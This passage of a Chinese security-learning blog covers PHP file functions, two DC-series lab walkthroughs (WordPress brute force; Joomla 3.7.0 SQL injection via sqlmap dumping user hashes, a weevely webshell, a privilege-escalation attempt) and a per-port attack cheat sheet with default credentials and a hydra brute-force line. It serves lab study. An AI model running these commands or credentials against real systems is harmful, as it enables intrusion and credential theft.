title="操作文件的函数"></a>操作文件的函数</h4><p>常见文件操作函数</p><ul><li><strong>Copy()</strong></li></ul><p>copy() 函数拷贝文件</p><p>语法：copy(source,destination)</p><pre><code>&lt;?phpecho copy(&quot;source.txt&quot;,&quot;target.txt&quot;);?&gt;</code></pre><p>输出1。</p><ul><li><p><strong>File_get_contents()/File_put_contents</strong></p><ul><li><p>file_get_contents() 把整个文件读入一个字符串中。</p><p>语法：file_get_contents(path,include_path,context,start,max_length)</p><pre><code>&lt;?phpecho file_get_contents(&quot;test.txt&quot;);?&gt;</code></pre></li><li><p>file_put_contents() 函数把一个字符串写入文件中。</p><p>语法：int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )</p><pre><code>&lt;?phpecho file_put_contents(&quot;sites.txt&quot;,&quot;Runoob&quot;);?&gt;</code></pre></li></ul></li><li><p><strong>File()</strong></p><ul><li><p>file() 函数把整个文件读入一个数组中。</p><p>数组中的每个元素都是文件中相应的一行，包括换行符在内</p><p>语法：file(path,include_path,context)</p><pre><code>&lt;?phpprint_r(file(&quot;test.txt&quot;));?&gt;</code></pre></li></ul></li><li><p><strong>Fopen()</strong></p><ul><li><p>open() 函数打开一个文件或 URL。</p><p>如果 fopen() 失败，它将返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。</p><p>语法：fopen(filename,mode,include_path,context)</p><pre><code>&lt;?php$file = fopen(&quot;test.txt&quot;,&quot;r&quot;);$file = fopen(&quot;/home/test/test.txt&quot;,&quot;r&quot;);$file = fopen(&quot;/home/test/test.gif&quot;,&quot;wb&quot;);$file = fopen(&quot;http://www.example.com/&quot;,&quot;r&quot;);$file = fopen(&quot;ftp://user:password@example.com/test.txt&quot;,&quot;w&quot;);?&gt;</code></pre></li></ul></li><li><p><strong>Move_uploaded_file()</strong></p><ul><li><p>move_uploaded_file() 函数把上传的文件移动到新位置。</p><p>如果成功该函数返回 TRUE，如果失败则返回 FALSE。</p><p>语法：move_uploaded_file(file,newloc)</p></li></ul></li><li><p><strong>Readfile()</strong></p><ul><li><p>readfile() 函数读取一个文件，并写入到输出缓冲。</p><p>语法：readfile(filename,include_path,context)</p><pre><code>&lt;?phpecho readfile(&quot;test.txt&quot;);?&gt;</code></pre></li></ul></li><li><p><strong>Rename()</strong></p><ul><li><p>rename() 函数重命名文件或目录。</p><p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p><p>语法：rename(oldname,newname,context)</p><pre><code>&lt;?phprename(&quot;images&quot;,&quot;pictures&quot;);?&gt;</code></pre></li></ul></li><li><p><strong>Unlink()</strong></p><ul><li><p>unlink() 函数删除文件。</p><p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p><p>语法：unlink(filename,context)</p><pre><code>&lt;?php$file = &quot;test.txt&quot;;if (!unlink($file)){echo (&quot;Error deleting $file&quot;);}else{echo (&quot;Deleted $file&quot;);}?&gt;</code></pre></li></ul></li></ul><h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://wh0ale.github.io/2019/08/21/php代码审计危险函数总结/" target="_blank" rel="noopener">https://wh0ale.github.io/2019/08/21/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/</a></p><p><a href="https://blog.csdn.net/qq_43431158/article/details/99673451" target="_blank" rel="noopener">https://blog.csdn.net/qq_43431158/article/details/99673451</a></p><p><a href="https://blog.csdn.net/zhezhebie/article/details/80508139" target="_blank" rel="noopener">https://blog.csdn.net/zhezhebie/article/details/80508139</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php危险函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-6靶机</title>
      <link href="/2020/03/31/dc-6-ba-ji/"/>
      <url>/2020/03/31/dc-6-ba-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="DC-6靶机学习"><a href="#DC-6靶机学习" class="headerlink" title="DC-6靶机学习"></a>DC-6靶机学习</h2><h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>我们设置靶机与kali均为.nat模式连接。</p><p>然后我们首先考虑获得靶机的IP地址。使用arp去发现内网存活主机，从而确定靶机IP为192.168.153.137。</p><pre><code>netdiscover -i eth0 -r 192.168.153.0/24</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209200455.png" alt=""></p><h4 id="第二步、信息收集"><a href="#第二步、信息收集" class="headerlink" title="第二步、信息收集"></a>第二步、信息收集</h4><p>我们使用神器nmap对靶机IP进行探测。</p><pre><code>nmap -A -p 1-65535 192.168.153.137 -T4</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209200850.png" alt=""></p><p>我们发现靶机开放了22端口和80端口。</p><p>我们直接访问IP发现被重定向到了<a href="http://wordy。" target="_blank" rel="noopener">http://wordy。</a></p><p>我们编辑 /etc/hosts中的文件添加该域名</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200211113951.png" alt=""></p><p>我们再次尝试访问192.168.153.137发现成功跳转，</p><p>我们利用火狐自带插件进行指纹识别</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200209201216.png" alt=""></p><p>我们可以确定该cms为WordPress，且数据库为MYSQL</p><h4 id="第三步、漏洞扫描"><a href="#第三步、漏洞扫描" class="headerlink" title="第三步、漏洞扫描"></a>第三步、漏洞扫描</h4><p>使用wordpress漏洞测试工具wpscan进行网站漏洞探测，wpscan是一款针对wordpress的黑盒漏洞扫描器，可以获得包括版本、主体、插件等信息。</p><pre><code>wpscan --url http://Wordy -u t</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209201612.png" alt=""></p><p>通过扫描我们得到几个系统的用户名信息。我们接下来思考能否获得任一账号的密码。</p><h4 id="第四步、漏洞利用"><a href="#第四步、漏洞利用" class="headerlink" title="第四步、漏洞利用"></a>第四步、漏洞利用</h4><p>我们首先根据作者的提示，使用到kali里面的rockyou.txt字典</p><p>使用解压命令：</p><pre><code>gzip -d rockyou.txt.gz</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209202612.png" alt=""></p><pre><code>cat rockyou.txt | grep k01&gt;k01.txt</code></pre><p>将里面的k01的部分导出到dc6目录下面的passwords.txt</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200209202622.png" alt=""></p><p>接着使用wpscan的暴力破解命令：</p><pre><code>wpscan --url wordy -u -p passwords.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209203905.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200209204033.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200209204455.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 靶机学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC-6靶机学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-3靶机</title>
      <link href="/2020/03/12/dc-3-ba-ji/"/>
      <url>/2020/03/12/dc-3-ba-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="DC-3靶机学习"><a href="#DC-3靶机学习" class="headerlink" title="DC-3靶机学习"></a>DC-3靶机学习</h2><h4 id="第一步、靶机安装与主机发现"><a href="#第一步、靶机安装与主机发现" class="headerlink" title="第一步、靶机安装与主机发现"></a>第一步、靶机安装与主机发现</h4><p>我们打开靶机，首先设置.nat连接，然后打开kali攻击机</p><p>使用nmap进行二层主机发现</p><pre><code>nmap -sn 192.168.153.1/24</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215121855.png" alt=""></p><h4 id="第二步、端口扫描与信息收集"><a href="#第二步、端口扫描与信息收集" class="headerlink" title="第二步、端口扫描与信息收集"></a>第二步、端口扫描与信息收集</h4><p>使用nmap进行简单的系统版本检测扫描。</p><pre><code>nmap -sV 192.168.153.153</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215121959.png" alt=""></p><p>发现80端口开放且运行Apache服务。</p><p>我们网页访问IP的80端口</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215122332.png" alt=""></p><p>使用Wappalyzer进行指纹识别，发现使用的Joomla系统建站。</p><h4 id="第三步、joomscan扫描"><a href="#第三步、joomscan扫描" class="headerlink" title="第三步、joomscan扫描"></a>第三步、joomscan扫描</h4><p>​        OWASPJoomla！漏洞扫描器（JoomScan）是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。该工具基于Perl开发，能够轻松无缝地对各种Joomla项目进行漏洞扫描，其轻量化和模块化的架构能够保证扫描过程中不会留下过多的痕迹。它不仅能够检测已知漏洞，而且还能够检测到很多错误配置漏洞和管理权限漏洞等等。除此之外，OWASP JoomScan使用起来非常简单，不仅提供了非常友好的用户界面，而且还能够以HTML或文本格式导出扫描报告</p><pre><code>  不知道为什么，我的kali里好像没有这个工具。。。</code></pre><p>我们从github上根据教程安装下载后。使用命令检测joomla的相关配置</p><pre><code>perl joomscan.pl -u http://192.168.153.153</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215123552.png" alt=""></p><p>我们得到了该Joomla的具体版本号为3.7.0.</p><h4 id="第四步、searchsploit工具查找漏洞"><a href="#第四步、searchsploit工具查找漏洞" class="headerlink" title="第四步、searchsploit工具查找漏洞"></a>第四步、searchsploit工具查找漏洞</h4><p>使用searchsploit工具查找Joomla 3.7.0 版本存在的漏洞。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215123726.png" alt=""></p><p>发现存在一个sql注入漏洞。</p><p>我们将该漏洞文档复制到根目录下，然后打开。</p><pre><code>cp /usr/share/exploitdb/exploits/php/webapps/42033.txt joomla-sql.txtcat joomla-sql.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124403.png" alt=""></p><p>文档中给出了sqlmap自动注入的payload.</p><h4 id="第五步、sqlmap自动注入"><a href="#第五步、sqlmap自动注入" class="headerlink" title="第五步、sqlmap自动注入"></a>第五步、sqlmap自动注入</h4><p>使用sqlmap自动注入工具对靶机执行sql注入代码。</p><ul><li>查询所有数据库：</li></ul><pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124833.png" alt=""></p><p>查询当前使用数据库：</p><pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --current-db -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124955.png" alt=""></p><p>查询joomladb数据库下的表：</p><pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215125207.png" alt=""></p><p>我们判断users表中应该有我们想要的账号密码，查询该表中的列：</p><pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215125855.png" alt=""></p><p>最后我们输出name,password的信息：</p><pre><code>sqlmap  -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;name,password&quot; --dump  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215130011.png" alt=""></p><h4 id="第六步、后台反弹getshell"><a href="#第六步、后台反弹getshell" class="headerlink" title="第六步、后台反弹getshell"></a>第六步、后台反弹getshell</h4><p>我们首先利用使用john爆破hash值：snoopy</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215130350.png" alt=""></p><p>使用dirsearch扫出后台文件</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215133942.png" alt=""></p><p>进入后台登录页面并登录</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215134103.png" alt=""></p><p>选择Templates模板，选择templates第一个模板即可，</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215134629.png" alt=""></p><p>用weevely生成php后门文件.</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215142748.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215142836.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215144846.png" alt=""></p><p>复制代码新建webshell.php文件，粘贴代码，保存</p><p>然后用weevely连，成功拿到shell.</p><h4 id="第七步、提权"><a href="#第七步、提权" class="headerlink" title="第七步、提权"></a>第七步、提权</h4><p>​    使用uname命令可知系统内核</p><p>Ubuntu 16.04，我们可以尝试使用kali自带的earchsploit工具查找Ubuntu 16.04的提权漏洞。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200215145305.png" alt=""></p><p>我们将这个漏洞的详细文件复制到root根目录下，然后查看</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200218161711.png" alt=""></p><p>我们将exp下载下来然后经过一系列的解压后</p><pre><code>unzip 39772.zip cd 39772tar -xvf exploit.tar  cd ebpf_mapfd_doubleput_exploit</code></pre><p>依次执行./compile.sh   </p><p>​                ./doubleput</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200218161152.png" alt=""></p><p>但是不知道为什么一直没法成功。。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 靶机学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC-3靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口渗透总结</title>
      <link href="/2020/03/12/duan-kou-shen-tou-zong-jie/"/>
      <url>/2020/03/12/duan-kou-shen-tou-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="端口渗透总结"><a href="#端口渗透总结" class="headerlink" title="端口渗透总结"></a>端口渗透总结</h2><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>口渗透过程中我们需要关注几个问题：</p><p>1、 端口的banner信息</p><p>2、 端口上运行的服务</p><p>3、 常见应用的默认端口</p><p>当然对于上面这些信息的获取，我们有各式各样的方法，最为常见的应该就是nmap了吧！我们也可以结合其他的端口扫描工具，比如专门的3389、1433等等的端口扫描工具；</p><h4 id="服务默认端口"><a href="#服务默认端口" class="headerlink" title="服务默认端口"></a>服务默认端口</h4><p>公认端口(Well Known Ports)：0-1023，他们紧密绑定了一些服务；</p><p>注册端口(Registered Ports)：1024-49151，他们松散的绑定了一些服务；</p><p>动态/私有：49152-65535，不为服务分配这些端口；</p><p>当然这些端口都可以通过修改来达到欺骗攻击者的目的，但是这就安全了吗？攻击者又可以使用什么攻击方式来攻击这些端口呢？</p><p>还需要注明的一点是：很多木马工具也有特定的端口</p><h3 id="文件共享服务端口渗透"><a href="#文件共享服务端口渗透" class="headerlink" title="文件共享服务端口渗透"></a>文件共享服务端口渗透</h3><h5 id="ftp服务"><a href="#ftp服务" class="headerlink" title="ftp服务"></a>ftp服务</h5><p>FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；</p><p>默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</p><p>攻击方式：</p><p>爆破：ftp的爆破工具有很多，这里我推荐owasp的<a href="https://sourceforge.net/projects/worawita/" target="_blank" rel="noopener">Bruter</a> 以及msf中ftp爆破模块；</p><p>匿名访问：用户名：anonymous 密码：为空或任意邮箱</p><p>用户名：FTP      密码：FTP或为空</p><p>用户名：USET     密码：pass</p><p>当然还有不需要用户名密码直接访问的，一般出现在局域网中；</p><p>嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）</p><p>后门技术：在linux的vsftp某一版本中，存在着一个后门程序，只要在用户名后面加上 就会在6200上打开一个监听Shell，我们可以使用telnet直接连接；详细<a href="http://www.freebuf.com/articles/system/34571.html" target="_blank" rel="noopener">请点击</a></p><p>远程溢出漏洞：6.10.1 IIS FTP远程溢出漏洞，在IIS FTP服务器中NLST命令存在一个缓冲区溢出漏洞，这个漏洞可能是攻击者在服务器运行一条非法命令。</p><p>跳转攻击：（Bounce Attacks）攻击者发送一个FTP”PORT”命令给目标FTP服务器，其中包含该主机的网络地址和被攻击的服务的端口号。这样，客户端就能命令FTP服务器发一个文件给被攻击的服务。这个文件可能包括根被攻击的服务有关的命令（如SMTP,NNTP等）。由于是命令第三方去连接到一种服务，而不是直接连接，就使得跟踪攻击者变得困难，并且还避开了基于网络地址的访问限制。</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0116499" target="_blank" rel="noopener">山东电信Serv-U Web客户端弱口令</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0102552" target="_blank" rel="noopener">长虹ftp弱口令导致全网数据泄漏</a></p><h5 id="NFS服务"><a href="#NFS服务" class="headerlink" title="NFS服务"></a>NFS服务</h5><p>nfs：网络文件系统，允许网络中的计算机通过TCP/IP网络共享资源。基于Linux系统，配置方面很简单，详细配置请参考案例分享。在nfs配置中，有不做任何限制的，有限制用户，有限制IP，以及在版本2.x中我们还可以使用证书来验证用户。当然不同的限制可以采用的攻击方式也不一样；就目前而言网上关于nfs的攻击还是比较少的!</p><p>默认端口：2049</p><p>攻击方式：</p><p>未授权访问：未限制IP以及用户权限设置错误</p><p>案例分享：</p><p><a href="http://drops.wooyun.org/tips/8659" target="_blank" rel="noopener">Nfs配置不当导致被入侵</a></p><p><a href="http://www.360doc.com/content/11/0410/14/2054285_108598426.shtml" target="_blank" rel="noopener">NFS服务全攻略</a></p><h5 id="Samba服务"><a href="#Samba服务" class="headerlink" title="Samba服务"></a>Samba服务</h5><p>Samba服务：对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。</p><p>默认端口：137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务）</p><p>攻击方式：</p><p>爆破：弱口令（爆破工具采用hydra）hydra -l username -P<br>PassFile IP smb</p><p>未授权访问：给予public用户高权限</p><p>远程代码执行漏洞：CVE-2015-0240等等</p><p>案例分享：</p><p><a href="http://www.secpulse.com/archives/5975.html" target="_blank" rel="noopener">Samba远程代码执行漏洞</a></p><p><a href="http://tech.soft6.com/667/10/45861.html" target="_blank" rel="noopener">未授权访问文件系统漏洞</a></p><h5 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h5><p>ldap：轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。</p><p>默认端口：389</p><p>攻击方式：</p><p>注入攻击：盲注</p><p>未授权访问：</p><p>爆破：弱口令</p><p>案例分享：</p><p><a href="http://drops.wooyun.org/tips/967" target="_blank" rel="noopener">LDAP注入与防御剖析</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-051234" target="_blank" rel="noopener">欧朋LDAP服务匿名访问</a></p><p><a href="http://drops.wooyun.org/pentesting/2125" target="_blank" rel="noopener">使用LDAP查询快速提升域权限</a></p><h4 id="远程连接服务端口渗透"><a href="#远程连接服务端口渗透" class="headerlink" title="远程连接服务端口渗透"></a>远程连接服务端口渗透</h4><h5 id="SSH服务"><a href="#SSH服务" class="headerlink" title="SSH服务"></a>SSH服务</h5><p>SSH服务：这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。</p><p>默认端口：22</p><p>攻击方式</p><p>爆破：弱口令、</p><p>漏洞：28退格漏洞、OpenSSL漏洞</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0135530" target="_blank" rel="noopener">安宇创新科技ssh弱口令</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0154829" target="_blank" rel="noopener">宜信贷某站存在OpenSSL漏洞</a></p><h5 id="Telnet服务"><a href="#Telnet服务" class="headerlink" title="Telnet服务"></a>Telnet服务</h5><p>Telnet服务：在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；</p><p>默认端口：23</p><p>攻击方式</p><p>爆破：弱口令</p><p>嗅探：此种情况一般发生在局域网；</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0162704" target="_blank" rel="noopener">大量惠普打印机远程telnet可被查看和操作</a></p><h5 id="Windows远程连接"><a href="#Windows远程连接" class="headerlink" title="Windows远程连接"></a>Windows远程连接</h5><p>​    远程桌面连接：作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；</p><p>默认端口：3389</p><p>攻击方式：</p><p>爆破：3389端口爆破工具就有点多了</p><p>Shift粘滞键后门：5次shift后门</p><p>3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机；</p><h5 id="VNC服务"><a href="#VNC服务" class="headerlink" title="VNC服务"></a>VNC服务</h5><p>VNC：一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也</p><p>默认端口：5900+桌面ID（5901；5902）</p><p>攻击方式：</p><p>爆破：弱口令</p><p>认证口令绕过：</p><p>拒绝服务攻击：（<a href="http://drops.wooyun.org/papers/9014" target="_blank" rel="noopener">CVE-2015-5239</a>）</p><p>权限提升：（CVE-2013-6886）</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0143044" target="_blank" rel="noopener">广西电信客服服务器使用VNC存在弱口令可直接控制</a></p><h5 id="Pcanywhere服务"><a href="#Pcanywhere服务" class="headerlink" title="Pcanywhere服务"></a>Pcanywhere服务</h5><p>​        PyAnywhere服务：一款远控工具，有点类似vnc的功能；这个服务在以前很多黑客发的视频里面都有，利用pcanywhere来进行提权；</p><p>默认端口：5632</p><p>攻击方式：</p><p>提权控制服务：</p><p>拒绝服务攻击：</p><p>代码执行：<a href="https://www.seebug.org/vuldb/ssvid-30050" target="_blank" rel="noopener">请参考</a></p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2013-034519/" target="_blank" rel="noopener">黑龙江物价局多处安全漏洞可能导致服务器沦陷(pcAnywhere提权+密码突破)</a></p><h3 id="Web应用服务端口渗透"><a href="#Web应用服务端口渗透" class="headerlink" title="Web应用服务端口渗透"></a>Web应用服务端口渗透</h3><p>​    HTTP服务：对于http服务其实是我们目前这几年比较常见的攻击入口，所以这里会针对http服务进行一个详细的详解；</p><p>注：这个板块的所有攻击方式，如果涉及到常规的web漏洞不会提出来，除非是特定的服务器才会产生的漏洞；</p><h5 id="IIS服务"><a href="#IIS服务" class="headerlink" title="IIS服务"></a>IIS服务</h5><p>默认端口：80/81/443</p><p>攻击方式：</p><p>IIS<br>PUT写文件：利用IIS漏洞，put方法直接将文件放置到服务器上</p><p>短文件名泄漏：这种一般没啥影响</p><p>解析漏洞：详细见apache服务</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-047134" target="_blank" rel="noopener">徐州市教育系统大量IIS PUT漏洞</a></p><p><a href="http://www.wooyun.org/bug.php?action=view&id=27365" target="_blank" rel="noopener">用友软件IIS写权限(PUT)导致可获取webshell控制服务器</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-093865" target="_blank" rel="noopener">国家电网某分站存在iis短文件名漏洞</a></p><h5 id="Apache-Tomcat-Nginx-Axis2"><a href="#Apache-Tomcat-Nginx-Axis2" class="headerlink" title="Apache/Tomcat/Nginx/Axis2"></a>Apache/Tomcat/Nginx/Axis2</h5><p>默认端口：80/8080</p><p>攻击方式：</p><p>爆破：弱口令（爆破manager后台）</p><p>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响；</p><p>解析漏洞：<a href="http://drops.wooyun.org/papers/539" target="_blank" rel="noopener">请参考</a></p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2013-018433" target="_blank" rel="noopener">安卓开发平台存在上传漏洞和Apache解析漏洞,成功获取webshell</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-06947" target="_blank" rel="noopener">腾讯分站 Apache 漏洞</a></p><h5 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h5><p>默认端口：7001</p><p>攻击方式：</p><p>爆破：弱口令 4组：用户名密码均一致：system weblogic（密码可能weblogic123） portaladmin guest</p><p>Congsole后台部署webshell：</p><p>Java反序列化：</p><p>泄漏源代码/列目录：这个太老了，估计网上都没有了吧！</p><p>SSRF窥探内网：<a href="http://www.wooyun.org/bugs/wooyun-2015-0136698" target="_blank" rel="noopener">央视网SSRF可窥探内网</a></p><p>案列分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-038214" target="_blank" rel="noopener">福建省人力资源和社会保障厅下属某WEBLOGIC弱口令</a></p><p><a href="http://drops.wooyun.org/tips/8321" target="_blank" rel="noopener">利用Weblogic进行入侵的一些总结</a></p><h5 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h5><p>默认端口8080；其他端口1098/1099/4444/4445/8080/8009/8083/8093</p><p>攻击方式：</p><p>爆破：弱口令（爆破jboss系统后台）</p><p>远程代码执行：<a href="http://www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html" target="_blank" rel="noopener">由于配置不当造成</a></p><p>Java反序列化：</p><p>案例分享</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-07409" target="_blank" rel="noopener">中华人民共和国民政部JBoss配置不当</a></p><p><a href="http://drops.wooyun.org/papers/178" target="_blank" rel="noopener">JBOSS安全问题总结</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0110279" target="_blank" rel="noopener">中国科学院某处jboss应用漏洞</a></p><h5 id="Websphere"><a href="#Websphere" class="headerlink" title="Websphere"></a>Websphere</h5><p>默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</p><p>攻击方式：</p><p>爆破：弱口令（控制台）</p><p>任意文件泄漏：（CVE-2014-0823）</p><p>Java反序列化</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-036803" target="_blank" rel="noopener">中国电信某通用型业务系统(Websphere)GetShell漏洞</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0167244" target="_blank" rel="noopener">大汉网络有限公司远程命令执行漏洞(WebSphere案例)</a></p><h5 id="GlassFish"><a href="#GlassFish" class="headerlink" title="GlassFish"></a>GlassFish</h5><p>默认端口：http 8080；IIOP 3700；控制台4848</p><p>攻击方式：</p><p>爆破：弱口令（对于控制台）</p><p>任意文件读取：</p><p>认证绕过：</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0144595/" target="_blank" rel="noopener">应用服务器glassfish存在通用任意文件读取漏洞</a></p><p><a href="http://www.tuicool.com/articles/ZRJriy" target="_blank" rel="noopener">Oracle GlassFish Server认证绕过</a></p><h5 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h5><p>默认端口：8080、8089</p><p>攻击方式：</p><p>爆破：弱口令（默认管理员）</p><p>未授权访问：</p><p>反序列化：</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2014-062541" target="_blank" rel="noopener">酷6Jenkins系统未授权访问可执行系统命令</a></p><h5 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h5><p>默认端口：8080</p><p>攻击方式：</p><p>目录遍历</p><p>远程文件读取</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-017200" target="_blank" rel="noopener">爱奇艺Resin配置漏洞</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0126353" target="_blank" rel="noopener">Resin漏洞利用案例之目录遍历/以金蝶某系统为例</a></p><h5 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h5><p> 默认端口：8080</p><p> 攻击方式：</p><p>远程共享缓冲区溢出</p><h5 id="Lotus"><a href="#Lotus" class="headerlink" title="Lotus"></a>Lotus</h5><p>影响的都是一些大型的企业，特别需要注意，经过以前的测试发现弱口令这个问题经常都存在，可能是很多管理员不知道如何去修改（不要打我）。</p><p>默认端口：1352</p><p>攻击方式：</p><p>爆破：弱口令（admin password）控制台</p><p>信息泄露</p><p>跨站脚本攻击</p><p>案例分享：</p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-053881" target="_blank" rel="noopener">Lotus Domino WebMail一处越权访问</a></p><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0134024" target="_blank" rel="noopener">中电投集团某系统弱口令直达内网涉及/OA系统/内部邮箱/财务系统/人力资源系统</a></p><p><a 